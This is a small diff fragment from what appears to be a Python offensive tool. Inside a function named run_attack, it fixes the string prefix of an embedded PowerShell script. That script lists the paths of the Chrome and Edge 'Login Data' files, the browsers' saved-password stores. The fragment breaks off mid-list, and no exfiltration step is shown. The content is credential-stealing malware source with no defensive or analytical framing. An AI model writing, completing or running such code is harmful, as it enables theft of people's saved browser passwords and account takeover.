@@ -241,7 +241,7 @@ def run_attack():
         time.sleep(3)
         return False
 
-    ps_script = f"""
+    ps_script = fr"""
 $paths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
